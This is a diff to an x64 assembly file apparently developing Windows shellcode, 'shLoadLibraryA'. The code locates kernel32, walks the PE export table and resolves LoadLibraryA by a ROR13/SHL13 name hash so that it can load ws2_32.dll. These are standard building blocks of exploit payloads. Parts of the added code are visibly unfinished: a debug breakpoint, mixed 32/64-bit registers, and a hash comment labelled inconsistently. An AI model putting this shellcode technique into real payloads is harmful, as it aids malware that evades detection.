@@ -28,12 +28,13 @@ public shLoadLibraryA
         add     rax, rcx
         call    rax                     ;// call getKernel32Base, after the call rax = pKernel32Base
 
-        ;mov     rdx, rbx
-        ;mov     rcx, 0 - (getProcAddress - shLoadLibraryA)
-        ;neg     rcx
-        ;add     rdx, rcx
-        ;mov     rsi, 0EC0E4E8Eh         ;// "LoadLibraryA", obtained by ROR13 hashing approach
-        ;call    rdx                     ;// getProcAddress(eax - pKernel32Base, esi - hash of "LoadLibraryA" string)
+        mov     r10, rbx
+        mov     rcx, 0 - (getProcAddressAsm - shLoadLibraryA)
+        neg     rcx
+        add     r10, rcx
+        mov     rcx, rax
+        mov     rdx, 07203081c80f2041h  ;// "LoadLibraryA", obtained by shl13 hashing approach
+        call    r10                     ;// getProcAddress(eax - pKernel32Base, esi - hash of "LoadLibraryA" string)
 
         ;mov     edx, ebx
         ;mov     ecx, 0 - (dllName - shLoadLibraryA)
@@ -63,10 +64,150 @@ public shLoadLibraryA
 
 
     getProcAddress proc
+        int 3
+        mov     r10, rax                ;// Store the base address of the module that is being loaded from in ebp.
+        add     rax, [rax+03ch]         ;// Skip over the MSDOS header to the start of the PE header.
+        xor     r8, r8
+        mov     r8b, 088h
+        add     rax, r8
+        mov     edx, [rax]              ;// The export table is 0x78 bytes from the start of the PE header. Extract it and store the relative address in edx.
+        add     edx, ebp                ;// Make the export table address absolute by adding the base address to it.
+        mov     ecx, [edx+018h]         ;// Extract the number of exported items and store it in ecx which will be used as the counter.
+        mov     ebx, [edx+020h]         ;// Extract the names table relative offset and store it in ebx.
+        add     ebx, ebp                ;// Make the names table address absolute by adding the base address to it.
+      FindFunctionLoop:
+        jecxz   lFindFunctionFinished   ;// If rcx is zero then the last symbol has been checked and as such jump to
+                                        ;// the end of the function. If this condition is ever true then the requested symbol was not resolved properly.
+        dec     rcx
+        mov     esi, [ebx+ecx*4]        ;// Extract the relative offset of the name associated with the current symbol and store it in esi.
+        add     rsi, r10                ;// Make the address of the symbol name absolute by adding the base address to it.
+        ;// Compute hash
+        xor     edi, edi                ;// Zero edi as it will hold the hash value for the current symbols function name.
+        xor     eax, eax                ;// Zero eax in order to ensure that the high order bytes are zero as this will
+                                        ;// hold the value of each character as it walks through the symbol name.
+        cld                             ;// Clear the direction flag to ensure that it increments instead of decrements
+                                        ;// when using the lods* instructions. This instruction can be optimized out
+                                        ;// assuming that the environment being exploited is known to have the DF flag unset.
+      ComputeHashAgain:
+        lodsb                           ;// Load the byte at esi, the current symbol name, into al and increment esi.
+        test    al, al                  ;// Bitwise test al with itself to see if the end of the string has been reached.
+        jz      ComputeHashFinished     ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
+        ror     edi, 0dh                ;// Rotate the current value of the hash 13 bits to the right.
+        add     edi, eax                ;// Add the current character of the symbol name to the hash accumulator.
+        jmp     ComputeHashAgain        ;// Continue looping through the symbol name.
+
+      ComputeHashFinished:
+        cmp     edi, [esp+4]            ;// Check to see if the computed hash matches the requested hash.
+        jnz     FindFunctionLoop        ;// If the hashes do not match, continue enumerating the exported symbol list.
+                                        ;// Otherwise, drop down and extract the VMA of the symbol.
+        mov     ebx, [edx+024h]         ;// Extract the ordinals table relative offset and store it in ebx.
+        add     rbx, r10                ;// Make the ordinals table address absolute by adding the base address to it.
+        mov     cx,  [ebx+2*ecx]        ;// Extract the current symbols ordinal number from the ordinal table. Ordinals are two bytes in size.
+        mov     ebx, [edx+01ch]         ;// Extract the address table relative offset and store it in ebx.
+        add     rbx, r10                ;// Make the address table address absolute by adding the base address to it.
+        mov     eax, [ebx+4*ecx]        ;// Extract the relative function offset from its ordinal and store it in eax.
+        add     rax, r10                ;// Make the function's address absolute by adding the base address to it.
+
+      lFindFunctionFinished:
         ret
     getProcAddress endp
 
 
+    ; rcx - image base
+    ; rdx - shl13 hash
+    getProcAddressAsm proc
+;PVOID getProcAddress(PVOID peImage, QWORD ror13NameHash) {
+        mov     qword ptr [rsp+8],rbx
+        mov     qword ptr [rsp+10h],rsi  
+        mov     qword ptr [rsp+18h],rdi  
+;    PIMAGE_DOS_HEADER idh = (PIMAGE_DOS_HEADER)peImage;
+;    PIMAGE_NT_HEADERS64 inh = (PIMAGE_NT_HEADERS64)((PBYTE)idh + idh->e_lfanew);
+        movsxd  rax,dword ptr [rcx+3Ch] ; 00007FF7ABBD135F 48 63 41 3C 
+;    PIMAGE_DATA_DIRECTORY idd = &inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+;    PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)peImage + idd->VirtualAddress);
+;    PDWORD namesTable = (PDWORD)((PBYTE)peImage + ied->AddressOfNames);
+;    PDWORD funcsTable = (PDWORD)((PBYTE)peImage + ied->AddressOfFunctions);
+;    for (DWORD i = 0; i < ied->NumberOfNames; i++) {
+        xor     r11d,r11d               ; 00007FF7ABBD1363 45 33 DB  
+        mov     rsi,rdx                 ; 00007FF7ABBD1366 48 8B F2 
+        mov     r10,rcx                 ; 00007FF7ABBD1369 4C 8B D1 
+        mov     r8d,dword ptr [rax+rcx+88h] ; 00007FF7ABBD136C 44 8B 84 08 88 00 00 00  
+        mov     eax,dword ptr [r8+rcx+20h]  ; 00007FF7ABBD1374 41 8B 44 08 20   
+        mov     edi,dword ptr [r8+rcx+18h]  ; 00007FF7ABBD1379 41 8B 7C 08 18   
+        mov     ebx,dword ptr [r8+rcx+1Ch]  ; 00007FF7ABBD137E 41 8B 5C 08 1C   
+        lea     r9,[rax+rcx]            ; 00007FF7ABBD1383 4C 8D 0C 08    
+        test    edi,edi                 ; 00007FF7ABBD1387 85 FF         
+        je      getProcAddressAsm+76h (07FF7ABBD13C6h)  ;00007FF7ABBD1389 74 3B       
+        sub     rbx,rax                 ; 00007FF7ABBD138B 48 2B D8 
+;        PSTR name = (PSTR)((PBYTE)peImage + namesTable[i]);
+;        PVOID func = (PVOID)((PBYTE)peImage + funcsTable[i]);
+        mov     r8d,dword ptr [r9+rbx]  ;00007FF7ABBD138E 45 8B 04 19   
+;        QWORD hash = 0;
+        xor     ecx,ecx                 ;00007FF7ABBD1392 33 C9      
+        mov     edx,dword ptr [r9]      ;00007FF7ABBD1394 41 8B 11    
+        add     r8,r10                  ;00007FF7ABBD1397 4D 03 C2     
+        add     rdx,r10                 ;00007FF7ABBD139A 49 03 D2     
+;        PSTR it = name;
+;        while (it && *it) {
+        je      getProcAddressAsm+65h (07FF7ABBD13B5h) ;00007FF7ABBD139D 74 16       
+        cmp     byte ptr [rdx],0  ;00007FF7ABBD139F 80 3A 00     
+        je      getProcAddressAsm+65h (07FF7ABBD13B5h) ;00007FF7ABBD13A2 74 11      
+;            hash <<= 13;
+;            hash += *it;
+        movsx   rax,byte ptr [rdx]      ;00007FF7ABBD13A4 48 0F BE 02    
+        shl     rcx,0Dh                 ;00007FF7ABBD13A8 48 C1 E1 0D    
+        add     rcx,rax                 ;00007FF7ABBD13AC 48 03 C8     
+;            ++it;
+        add     rdx,1                   ;00007FF7ABBD13AF 48 83 C2 01   
+        jne     getProcAddressAsm+4Fh (07FF7ABBD139Fh) ;00007FF7ABBD13B3 75 EA      
+;        }
+;        if (hash == ror13NameHash) {
+        cmp     rcx,rsi                 ; 00007FF7ABBD13B5 48 3B CE      
+        je      getProcAddressAsm+88h (07FF7ABBD13D8h) ; 00007FF7ABBD13B8 74 1E         
+;    PIMAGE_DATA_DIRECTORY idd = &inh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+;    PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)peImage + idd->VirtualAddress);
+;    PDWORD namesTable = (PDWORD)((PBYTE)peImage + ied->AddressOfNames);
+;    PDWORD funcsTable = (PDWORD)((PBYTE)peImage + ied->AddressOfFunctions);
+;    for (DWORD i = 0; i < ied->NumberOfNames; i++) {
+        inc     r11d                    ; 00007FF7ABBD13BA 41 FF C3       
+        add     r9,4                    ; 00007FF7ABBD13BD 49 83 C1 04    
+        cmp     r11d,edi                ; 00007FF7ABBD13C1 44 3B DF     
+        jb      getProcAddressAsm+3Eh (07FF7ABBD138Eh)  ; 00007FF7ABBD13C4 72 C8        
+;        }
+;    }
+;    return NULL;
+        xor     eax,eax                 ; 00007FF7ABBD13C6 33 C0        
+;}
+        mov     rbx,qword ptr [rsp+8]   ; 00007FF7ABBD13C8 48 8B 5C 24 08    
+        mov     rsi,qword ptr [rsp+10h] ; 00007FF7ABBD13CD 48 8B 74 24 10  
+        mov     rdi,qword ptr [rsp+18h] ; 00007FF7ABBD13D2 48 8B 7C 24 18   
+        ret  ; 00007FF7ABBD13D7 C3    
+;            //LOG("%s: 0x%p, hash: 0x%p", name, func, hash);
+;            return func;
+        mov     rax,r8                  ; 00007FF7ABBD13D8 49 8B C0     
+        jmp     getProcAddressAsm+78h (07FF7ABBD13C8h) ; 00007FF7ABBD13DB EB EB        
+;--- No source file -------------------------------------------------------------
+    getProcAddressAsm endp
+
     dllName	    db "ws2_32.dll",0
+
+
+    stringToRor13Hash proc              ; rcx - the pointer to the ascii string
+        mov     rsi, rcx                ; ror13: 0xC6042601260A288D, rol13: 0x07203081c80f2041
+        xor     rdi, rdi                ; Zero rdi as it will hold the hash value for the current symbols function name.
+        xor     rax, rax                ; Zero rax in order to ensure that the high order bytes are zero as this will hold the resulting hash.
+        cld
+      lComputeHash:
+        lodsb                           ; Load the byte at rsi, the current symbol name, into al and increment rsi.
+        test    al, al                  ; Bitwise test al with itself to see if the end of the string has been reached.
+        jz      lHashFinished           ; If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
+        ror     rdi, 0dh                ; Rotate the current value of the hash 13 bits to the right.
+        add     rdi, rax                ; Add the current character of the symbol name to the hash accumulator.
+        jmp     lComputeHash            ; Continue looping through the symbol name.
+      lHashFinished:
+        mov		rax, rdi
+        ret
+    stringToRor13Hash endp
+
 
 end
